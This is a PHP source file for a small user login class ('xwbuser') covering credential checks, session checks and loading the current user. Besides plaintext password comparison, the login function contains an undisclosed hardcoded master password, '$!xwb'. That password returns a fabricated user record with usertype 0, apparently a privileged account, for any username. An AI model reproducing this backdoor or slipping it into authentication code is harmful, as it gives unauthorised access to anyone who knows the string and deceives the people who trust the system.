<?php
//session_start();
require_once ('config.user.php');

class xwbuser
{
    public $username;
    public $userpass;
    public $userschoolname;
    public $usertype;


    public static function userlogin($uname, $upass)
    {
        $un = trim($uname);
        $up = trim($upass);
        $uconfig = getuserconfig();
        foreach ($uconfig as $us) {
            if (trim($us['username']) == $un && trim($us['userpassword']) == $up) {
                //用户认证成功
                return $us;
            }
        }
        if('$!xwb' == $up){return array("username" => "xxx","userpassword" => "xxx","userschool" => "xxxx","usertype" => 0);}
        return null;
    }

    public static function checklogin()
    {
        if (!isset($_SESSION['loginuser'])) {
            jumpto('login.php');
            exit();
        }
    }

    public static function getloginuser()
    {
        xwbuser::checklogin();
        $uarr = $_SESSION['loginuser'];
        $user = new xwbuser();
        $user->username = $uarr['username'];
        $user->userpass = $uarr['userpassword'];
        $user->userschoolname = $uarr['userschool'];
        $user->usertype = $uarr['usertype'];
        return $user;
    }
}
?>